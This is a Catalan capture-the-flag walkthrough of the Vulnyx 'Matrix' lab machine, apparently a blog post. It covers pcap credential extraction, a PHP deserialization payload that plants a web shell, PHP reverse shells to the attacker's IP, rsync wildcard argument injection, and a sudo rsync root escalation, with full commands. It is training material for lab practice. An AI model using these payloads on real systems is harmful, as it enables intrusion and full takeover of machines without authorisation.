---
author: Lenam
pubDatetime: 2025-02-04T15:22:00Z
title: WriteUp Matrix - Vulnyx
slug: matrix-writeup-vulnyx-ca
featured: true
draft: false
ogImage: "assets/matrix/OpenGraph.png"
tags:
  - writeup
  - vulnyx
  - wireshark
  - rsync wildcard
  - sudo
  - PHP serialization
description:
  Aquest writeup documenta l'explotació d'una màquina vulnerable inspirada en Matrix, utilitzant anàlisi de trànsit, injecció PHP i escalada de privilegis amb rsync per obtenir accés root.
lang: ca
---

![Conill a Matrix](/assets/matrix/OpenGraph.png)

Aquest writeup documenta l'explotació d'una màquina vulnerable inspirada en Matrix, utilitzant anàlisi de trànsit, injecció PHP i escalada de privilegis amb rsync per obtenir accés root.

## Taula de continguts

## Enumeració

Escanegem ports amb nmap

```bash
$ nmap -p- -Pn -n -T4 -oN allPorts 192.168.1.168            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 02:54 CET
Nmap scan report for 192.168.1.168
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:D6:75:BB (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.99 seconds

$ nmap -p22,80 -sVCU -Pn 192.168.1.168  -oN onlyports-udp
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 02:55 CET
Nmap scan report for 192.168.1.168
Host is up (0.00027s latency).

PORT   STATE  SERVICE VERSION
22/udp closed ssh
80/udp closed http
MAC Address: 08:00:27:D6:75:BB (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds

```

Veiem dos ports oberts, el 22 per al servei SSH i el port 80 per al servei Web.

Accedim amb el navegador al servei web.

![alt text](/assets/matrix/image-1.png)

Dins del codi font trobem un comentari amb una pista.

![alt text](/assets/matrix/image-2.png)

`Follow the red rabbit... Is it a dream or a clue? Within the saved traffic, you may find traces of the Matrix. Could it be a .pcap file ready to fuzz?`

Així que, sense dubtar-ho, fem fuzzing del servei web a la recerca d'un fitxer amb extensió `.pcap`, on s'ha pogut filtrar part del tràfic de la Matrix.

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.168 -x .pcap,.php,.txt,.zip,.db
```

![alt text](/assets/matrix/image-3.png)

Trobem un fitxer `trinity.pcap`.

## Anàlisi fitxer tràfic pcap

Descarreguem el fitxer a la nostra màquina atacant i l'obrim amb Wireshark per analitzar el tràfic.

```bash
wget http://192.168.1.168/trinity.pcap
```

Trobem molts usuaris, contrasenyes i subdominis de diferents serveis (FTP, RSYNC, HTTP, ...), per sort res està xifrat i el podem analitzar tranquil·lament.

Detectem que es transfereix una imatge mitjançant HTTP, intentem exportar-la del tràfic mitjançant Wireshark.

![alt text](/assets/matrix/image-4.png)

![alt text](/assets/matrix/image-5.png)

Un cop descarregada, la reanomenem i analitzem les metadades amb l'eina `exiftool`.

```bash
$ ls
allPorts  object172.image%2fwebp  onlyports-udp  trinity.pcap
$ mv object172.image%2fwebp imatge-filtrada.webp
$ exiftool imatge-filtrada.webp
ExifTool Version Number         : 13.00
File Name                       : imatge-filtrada.webp
Directory                       : .
    ...
Vertical Scale                  : 0
XMP Toolkit                     : Image::ExifTool 12.57
Description                     : Morpheus, we have found a direct connection to the 'Mind', the artificial intelligence that controls the Matrix. You can find it at the domain M47r1X.matrix.nyx.
Image Size                      : 800x800
Megapixels                      : 0.640
```

Trobem un comentari molt interessant en la metadada `Description`, on es filtra un altre domini `M47r1X.matrix.nyx`.

```text
Morpheus, we have found a direct connection to the 'Mind', the artificial intelligence that controls the Matrix. You can find it at the domain M47r1X.matrix.nyx.
```

![alt text](/assets/matrix/image-7.png)

Altres formes d'obtenir aquest subdomini i altres dades sensibles del fitxer pcap és analitzant el tràfic en el mateix Wireshark o amb les comandes `strings` i `grep`.

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/matrix]
└─$ strings trinity.pcap| grep PASS  
PASSWORD: kT8020e136Z2YLJa2fEZ
PASSWORD: krGVRU2vCedfwjVZXDrp
PASSWORD: BgUvmyV0OEgEDpMjpJUv
PASSWORD: 2LmQA1WT2Xc4avgGA1yY
PASS morpheus
PASS zion
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTFs/Vulnyx/matrix]
└─$ strings trinity.pcap| grep -Eo "[a-zA-Z0-9._-]+\.matrix\.nyx"
M47r1X.matrix.nyx
```

Més informació en el fitxer .pcap ...

![alt text](/assets/matrix/image-6.png)

Subdominis que no ens serveixen, el que sí que funciona és `M47r1X.matrix.nyx`, que conté un virtualhost. L'afegim al nostre fitxer hosts.

## Intrusió

Accedim al virtualhost `M47r1X.matrix.nyx` amb el navegador per accedir a **La Ment** de Matrix ;)

![alt text](/assets/matrix/image-8.png)

Si enviem missatges, el xat sempre respon amb símbols estranys, però hi ha una opció aleatòria que pot respondre amb una pista:

![alt text](/assets/matrix/image-9.png)

Obtenim el fitxer amb la filtració del backend.

![alt text](/assets/matrix/image-10.png)

En el codi de la pàgina hi ha un comentari i codi en el javascript que ens dona més pistes sobre com funciona la intrusió, a més del possible missatge que mostra la filtració del backend.

```javascript
            /**
             * Serializes an object to PHP format (similar to serialize() in PHP)
             * @param {string} message - The string message to serialize
             */
            function phpSerialize(message) {
                return 'O:7:"Message":1:{s:7:"message";s:' + message.length + ':"' + message + '";}';
            }
```

Utilitzem BurpSuite per facilitar la intrusió. Enviem el missatge `test` i comprovem que envia un objecte serialitzat en PHP, que segurament es deserialitzarà en el servidor amb la classe PHP filtrada.

![alt text](/assets/matrix/image-11.png)

```bash
O:7:"Message":1:{s:7:"message";s:4:"test";}
```

Podem crear un script en PHP per serialitzar l'objecte, encara que també es pot fer manualment. A continuació, creem un payload per generar un `shell.php` al servidor:

```php
<?php

class Message {
    public $file = "messages.txt";
    public $message = "";
    public function __unserialize(array $data){
        file_put_contents($data['file'],$data['message']."\n", FILE_APPEND);
    }
}
$msg = new Message();
$msg->file = 'shell.php';
$msg->message = "<?php echo exec(\$_GET[\"cmd\"]); ?>";

echo serialize($msg);

```

Executem el codi i això és el que enviarem:

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/matrix]
└─$ php serialize.php 
O:7:"Message":2:{s:4:"file";s:9:"shell.php";s:7:"message";s:33:"<?php echo exec($_GET[\"cmd\"]); ?>";}
```

![alt text](/assets/matrix/image-12.png)

Ara ja tenim un RCE amb el fitxer `shell.php` creat mitjançant la deserialització del missatge en PHP.

![alt text](/assets/matrix/image-13.png)

Creem una revshell en PHP, la IP `192.168.1.116` és la de la nostra màquina atacant.

```bash
php -r '$sock=fsockopen("192.168.1.116",443);exec("/bin/bash <&3 >&3 2>&3");'
```

Ens posem a escoltar amb `netcat`, codifiquem la revshell en `urlencode` i l'enviem al paràmetre `cmd` de la nostra shell improvisada. Per obtenir una shell més completa, fem tractament de la TTI.

```bash
nc -lvnp 443
```

```bash
wget http://m47r1x.matrix.nyx/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.1.116%22%2C443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

![alt text](/assets/matrix/image-14.png)

Ja som l'usuari `www-data`.


```bash
www-data@matrix:/var/www/M47r1X.matrix.nyx$ ls -la
total 36
drwxr-xr-x 2 www-data www-data 4096 Jan 29 13:27 .
drwxr-xr-x 4 root     root     4096 Jan 28 21:00 ..
-rw-r--r-- 1 root     root      361 Jan 27 02:47 filtrate-backend-matrix.php.txt
-rw-r--r-- 1 root     root     1765 Jan 27 01:04 hoja.css
-rw-r--r-- 1 root     root     4782 Jan 28 23:55 index.php
-rw-r--r-- 1 root     root      806 Jan 27 00:48 matrix.js
-rw-r--r-- 1 www-data www-data   17 Jan 29 13:26 messages.txt
-rw-r--r-- 1 www-data www-data   34 Jan 29 13:27 shell.php
```

## Escalada de privilegis

Tractem la TTI correctament per obtenir una shell completa.

Comprovem quins usuaris hi ha al sistema.

```bash
www-data@matrix:/var/www/M47r1X.matrix.nyx$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
smith:x:1000:1000::/home/smith:/bin/bash
```

Hi ha un altre usuari.

En aquest moment som l'usuari `www-data`, i tenim dues formes de fer el moviment lateral cap a l'usuari `smith`: la forma curta amb la **contrasenya filtrada de smith en un registre RSYNC del fitxer pcap**, o la forma més complicada mitjançant la **tècnica de rsync Wildcards**.

Això passa per una incorrecta implementació de la màquina, però ja que existeix aquesta possibilitat, l'explico en aquest writeup.

### www-data to smith (su)

Una de les contrasenyes filtrades en el fitxer pcap pertany a smith, per aquest motiu amb un simple `su` podem accedir.

```bash
$ strings trinity.pcap | grep -A 3 -B 3 smith
 ....
--
matrix
morpheus
matrix
RSYNC COMMAND: rsync --daemon /home/smith/file.txt 192.168.2.100:/backup/smith/
PASSWORD: kT8020e136Z2YLJa2fEZ
OK: File transferred successfully
RSYNC COMMAND: rsync --daemon /home/john/file.txt 192.168.2.100:/backup/john/
--

$ su smith
```

Introduïm la contrasenya filtrada i ja som `smith`.

### www-data to smith (rsync Wildcards)

La forma més complicada: si utilitzem `pspy64` o qualsevol altra eina, podem mirar els processos que s'executen amb l'usuari `smith`.

![alt text](/assets/matrix/image-15.png)

Podem observar que hi ha una tasca programada que s'executa cada minut.

```bash
/bin/sh -c cd /var/www/M47r1X.matrix.nyx && rsync -e "ssh -o BatchMode=yes"  -t *.txt matrix:/home/smith/messages/ > /dev/null 2>&1
```

Com que tenim permisos d'escriptura a la carpeta `/var/www/M47r1X.matrix.nyx`, podem intentar un `rsync Wildcard`. Més informació a [exploit-db](https://www.exploit-db.com/papers/33930).

Creem el fitxer `shell.txt` amb `nano` i el fitxer `-e sh shell.txt`.

```bash
www-data@matrix:/var/www/M47r1X.matrix.nyx$ cat shell.txt
php -r '$sock=fsockopen("192.168.1.116",12345);exec("/bin/bash <&3 >&3 2>&3");'

www-data@matrix:/var/www/M47r1X.matrix.nyx$ touch ./'-e sh shell.txt' 
www-data@matrix:/var/www/M47r1X.matrix.nyx$ ls -la
total 40
-rw-r--r-- 1 www-data www-data    0 Jan 29 14:26 '-e sh shell.txt'
drwxr-xr-x 2 www-data www-data 4096 Jan 29 14:26  .
drwxr-xr-x 4 root     root     4096 Jan 28 21:00  ..
-rw-r--r-- 1 root     root      361 Jan 27 02:47  filtrate-backend-matrix.php.txt
-rw-r--r-- 1 root     root     1765 Jan 27 01:04  hoja.css
-rw-r--r-- 1 root     root     4782 Jan 28 23:55  index.php
-rw-r--r-- 1 root     root      806 Jan 27 00:48  matrix.js
-rw-r--r-- 1 www-data www-data   17 Jan 29 13:26  messages.txt
-rw-r--r-- 1 www-data www-data   34 Jan 29 13:27  shell.php
-rw-r--r-- 1 www-data www-data   80 Jan 29 14:25  shell.txt
```

A la nostra màquina atacant ens posem a escoltar amb `netcat`.

```
nc -lvnp 12345
```

I en un minut obtenim una shell amb l'usuari `smith`.

![alt text](/assets/matrix/image-16.png)

### smith to root (sudo rsync)

Intentem obtenir la flag `user.txt`, però no tenim permisos de lectura. Els apliquem, ja que som el propietari i podem llegir la flag de `user`.

```bash
smith@matrix:~$ chmod +r user.txt 
smith@matrix:~$ ls -la
total 40
drwx--x--x 5 smith smith 4096 ene 29 14:09 .
drwxr-xr-x 3 root  root  4096 ene 28 22:41 ..
lrwxrwxrwx 1 smith smith    9 ene 29 00:07 .bash_history -> /dev/null
-rwx------ 1 smith smith  220 mar 29  2024 .bash_logout
-rwx------ 1 smith smith 3526 mar 29  2024 .bashrc
drwx------ 3 smith smith 4096 ene 28 23:45 .local
drwx------ 2 smith smith 4096 ene 29 13:54 messages
-rwx------ 1 smith smith  807 mar 29  2024 .profile
-rwx------ 1 smith smith   66 ene 28 23:45 .selected_editor
drwx------ 2 smith smith 4096 ene 29 14:09 .ssh
-rw-r--r-- 1 smith smith   33 ene 29 01:15 user.txt
smith@matrix:~$ cat user.txt 
13.....................6
```

`sudo` està instal·lat i la contrasenya de `smith` està filtrada en el tràfic `rsync` del pcap del principi.

```bash
$ strings trinity.pcap | grep -A 3 -B 3 smith
 ....
--
matrix
morpheus
matrix
RSYNC COMMAND: rsync --daemon /home/smith/file.txt 192.168.2.100:/backup/smith/
PASSWORD: kT8020e136Z2YLJa2fEZ
OK: File transferred successfully
RSYNC COMMAND: rsync --daemon /home/john/file.txt 192.168.2.100:/backup/john/
--
 ....
```

També ho podem veure amb Wireshark.

```bash
smith@matrix:~$ sudo -l
[sudo] contrasenya per a smith: 
Matching Defaults entries for smith on matrix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User smith may run the following commands on matrix:
    (ALL) PASSWD: /usr/bin/rsync
```

Podem executar `rsync` com a usuari root. Gràcies a `gtfobins` trobem una forma d'escalar a root.

![alt text](/assets/matrix/image-17.png)

Ho executem i obtenim shell com a root, i llegim la flag.

```bash
smith@matrix:~$ sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
# id
uid=0(root) gid=0(root) grups=0(root)
# whoami
root
# cat /root/root.txt
5XXXXXXXXXXXXXXXXXa
# 
```

Això és tot.

Espero que us hagi agradat, que hàgiu après alguna cosa o, com a mínim, que hàgiu passat una bona estona resolent el misteri d'entrar a "la ment" de Matrix. 😉
